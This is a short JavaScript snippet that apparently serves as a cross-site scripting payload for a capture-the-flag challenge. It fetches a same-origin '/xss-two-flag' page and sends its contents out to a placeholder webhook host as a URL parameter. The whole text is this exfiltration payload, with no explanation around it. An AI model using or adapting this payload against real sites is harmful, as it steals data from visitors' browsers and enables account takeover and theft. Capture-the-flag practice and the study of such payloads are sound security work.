fetch('/xss-two-flag')
  .then(r => r.text())
  .then(flag => {
    fetch('https://YOUR-WEBHOOK-SITE-URL/?flag=' + encodeURIComponent(flag));
  });
